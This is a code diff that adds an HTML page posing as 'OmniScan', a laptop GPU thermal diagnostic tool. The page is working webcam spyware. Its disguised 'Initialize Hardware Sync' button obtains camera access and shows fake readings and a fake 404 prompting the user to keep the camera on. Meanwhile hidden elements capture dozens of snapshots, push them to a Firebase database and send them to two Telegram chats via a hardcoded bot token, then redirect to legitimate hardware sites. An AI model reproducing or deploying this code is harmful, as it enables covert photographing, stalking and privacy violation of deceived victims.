@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OmniScan | Industrial Component Lab</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gpu-orange: #f97316;
+            --component-bg: #0a0a0a;
+            --panel-hex: #171717;
+            --glass: rgba(255, 255, 255, 0.03);
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--component-bg); 
+            color: #e5e5e5;
+            font-family: 'Space Grotesk', sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            padding: 25px 50px; background: var(--panel-hex);
+            border-bottom: 1px solid #262626;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .logo { font-weight: 900; font-size: 20px; color: var(--gpu-orange); letter-spacing: 2px; }
+
+        .lab-container {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 30px;
+        }
+
+        .module-card {
+            width: 100%; max-width: 480px; 
+            background: var(--panel-hex);
+            border: 1px solid #262626; border-radius: 20px;
+            padding: 45px; text-align: center;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
+        }
+
+        /* Disguised Camera UI: Thermal Mapping Scanner */
+        .thermal-viewport {
+            width: 180px; height: 180px; margin: 0 auto 35px;
+            background: #000; border-radius: 24px;
+            border: 2px solid #404040; position: relative;
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
+        }
+
+        .thermal-grid {
+            position: absolute; width: 100%; height: 100%;
+            background-image: linear-gradient(#1f1f1f 1px, transparent 1px), linear-gradient(90deg, #1f1f1f 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .heat-sig {
+            width: 80px; height: 80px; background: var(--gpu-orange);
+            filter: blur(40px); border-radius: 50%;
+            animation: heat-fluctuate 4s infinite alternate;
+        }
+        @keyframes heat-fluctuate { from { transform: scale(0.8); opacity: 0.3; } to { transform: scale(1.4); opacity: 0.6; } }
+
+        .lidar-line {
+            position: absolute; width: 100%; height: 2px;
+            background: #ef4444; box-shadow: 0 0 15px #ef4444;
+            top: 0; animation: lidar-scan 2.5s infinite ease-in-out;
+        }
+        @keyframes lidar-scan { 0% { top: 0%; } 100% { top: 100%; } }
+
+        .btn-init {
+            background: #fff; color: #000; border: none;
+            width: 100%; padding: 20px; border-radius: 12px;
+            font-weight: 800; font-size: 14px; text-transform: uppercase;
+            cursor: pointer; transition: 0.2s;
+        }
+        .btn-init:hover { background: var(--gpu-orange); color: #fff; }
+
+        /* Logic Views */
+        #sync-ui, #error-404 { display: none; }
+
+        .component-list {
+            text-align: left; margin-top: 30px;
+            border-top: 1px solid #262626; padding-top: 20px;
+        }
+        .comp-item {
+            display: flex; justify-content: space-between; margin-bottom: 12px;
+            font-size: 12px; font-family: 'Fira Code', monospace;
+        }
+        .comp-status { color: var(--gpu-orange); }
+
+        /* 404 Visuals */
+        .error-num { font-size: 100px; font-weight: 900; color: #262626; margin: 0; }
+        .loc-tag { font-size: 10px; color: #525252; margin-top: 30px; letter-spacing: 3px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">OMNI_SCAN // LP-7</div>
+        <div style="font-size: 10px; color: #737373;">MUMBAI_FACILITY_R4</div>
+    </div>
+
+    <div class="lab-container">
+        <!-- Dashboard Start -->
+        <div class="module-card" id="init-view">
+            <div class="thermal-viewport">
+                <div class="thermal-grid"></div>
+                <div class="heat-sig"></div>
+                <div class="lidar-line"></div>
+            </div>
+            <h2 style="margin:0 0 10px;">LIDAR Thermal Analysis</h2>
+            <p style="font-size: 13px; color: #a3a3a3; margin-bottom: 35px; line-height: 1.6;">
+                Verify GPU TDP and thermal throttling through <b>Optical Component Mapping</b>. We use LIDAR-simulated visual data to detect heat dissipation patterns on your laptop's chassis.
+            </p>
+            <button class="btn-init" onclick="runDiagnostics()">Initialize Hardware Sync</button>
+        </div>
+
+        <!-- Testing UI -->
+        <div class="module-card" id="sync-ui">
+            <div class="thermal-viewport" style="border-color: var(--gpu-orange);">
+                <div class="heat-sig" style="opacity: 0.8; background: #ef4444;"></div>
+                <div class="lidar-line" style="animation-duration: 0.5s;"></div>
+            </div>
+            <h2 id="status-text">Mapping Components...</h2>
+            <div class="component-list">
+                <div class="comp-item"><span>GPU_TDP_DRAW</span><span class="comp-status" id="gpu-val">CALCULATING</span></div>
+                <div class="comp-item"><span>VRAM_TEMP</span><span class="comp-status">64°C</span></div>
+                <div class="comp-item"><span>OPTICAL_BRIDGE</span><span class="comp-status" style="color:#22c55e">ESTABLISHED</span></div>
+            </div>
+        </div>
+
+        <!-- 404 Page -->
+        <div class="module-card" id="error-404">
+            <p class="error-num">404</p>
+            <h2 style="color: #ef4444; margin: 0;">Component Handshake Lost</h2>
+            <p style="font-size: 13px; color: #a3a3a3; margin-top: 15px;">
+                The Mumbai Component Lab cannot verify your hardware's physical signature. Please keep the camera sensor active to re-map the laptop's thermal profile and re-establish the encrypted GPU bridge.
+            </p>
+            <div class="btn-init" style="background: #262626; color: #525252; margin-top: 20px;">Retrying Optical Link...</div>
+            <div class="loc-tag">MUMBAI_DC_WEST_404</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function runDiagnostics() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        // Simulate GPU power draw
+                        const watts = Math.floor(Math.random() * (115 - 90 + 1) + 90);
+                        document.getElementById('gpu-val').innerText = watts + "W";
+                        
+                        if (count <= 55) {
+                            componentCapture(count);
+                        }
+
+                        // Trigger 404 at 35 seconds
+                        if (count === 35) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.cpuid.com/softwares/hwmonitor.html";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.userbenchmark.com/Software";
+            }
+        }
+
+        function componentCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "HARDWARE_THERMAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_FACILITY_R4" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'laptop_thermal_scan.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
